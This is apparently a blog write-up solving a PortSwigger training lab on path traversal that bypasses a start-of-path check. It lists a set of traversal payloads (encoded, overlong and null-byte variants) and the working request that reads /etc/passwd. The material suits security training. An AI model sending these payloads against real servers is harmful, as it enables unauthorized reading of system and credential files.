---
title: " PortSwiggerlabs: File path traversal, validation of start of path "
date: 2026-08-21 00:00:00 +0000
categories: [PortSwiggerLabs , Path Traversal ]
tags: [PortSwiggerLabs , Path Traversal , Challenge , Web_Attacks ]
---


## Scenario : 

This lab contains a path traversal vulnerability in the display of product images.

The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

To solve the lab, retrieve the contents of the /etc/passwd file.


## Solution : 

<img width="1888" height="890" alt="image" src="https://github.com/user-attachments/assets/badd5378-f4a4-4d55-90d7-953af7c6b9c5" />

First we navigate the app like a normal user then we check Burp's History : 

<img width="1545" height="758" alt="image" src="https://github.com/user-attachments/assets/8bfb92ed-48a5-4214-b0d8-ff396e0afad7" />

We're mainly interested in these 2 requests , since they both contain parameters we can inject . 

To save time , i will assume the ProductID isn't vulnerable since that was the case with all labs before , and we focus on Filename . 

I first injected all these payloads from payload all the things :

```text
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
```

As well as the Payloads that worked from earlier Labs : 

```bash
%252e%252e%252fetc%252fpasswd
%252e%252e%252fetc%252fpasswd%00
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
....//....//....//etc/passwd
..///////..////..//////etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
/etc/passwd
%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
```

But none of them worked . 

<img width="1439" height="684" alt="image" src="https://github.com/user-attachments/assets/34b3e58f-e34c-40e3-8303-f99a9455d1fa" />

We even get a new error message : 

```text
"Missing parameter 'filename'"
```

Looking at the original parameter value , we see that we're specifying a path where the images are stored .

```bash
/var/www/images/22.jpg 
# If we change it to :
/var/www/images/aaa.jpg
```

<img width="1615" height="665" alt="image" src="https://github.com/user-attachments/assets/9e87a459-4b98-46ba-8102-79eac8d1e6e1" />

We see that we have a new error message saying that the file doesn't exist . 

I m assuming that the server needs to see the **/var/www/images** path to validate the filename parameter . 

What we can do is keep the **/var/www/images** and from there we try our LFI payload : 

I will use the double encoded one : 

```bash
%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd

# So the parameter will be :
?filename=/var/www/images/%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
```

<img width="1378" height="638" alt="image" src="https://github.com/user-attachments/assets/dae7c69c-a467-4391-a70c-ce19c4dfeb10" />

The double encoded one didn't work -_- . 

But when removing the encoding , it worked perfectly : 

```bash
GET /image?filename=/var/www/images/../../../../etc/passwd
```

<img width="1572" height="821" alt="image" src="https://github.com/user-attachments/assets/8523317a-f836-4936-8018-e047ee156f0a" />

Now if we go back to the lab , it should be solved . 

<img width="1854" height="900" alt="image" src="https://github.com/user-attachments/assets/e07a8004-e7fe-45e7-8eb2-52982db7f23d" />

That was all for this lab , see you in the next one :)

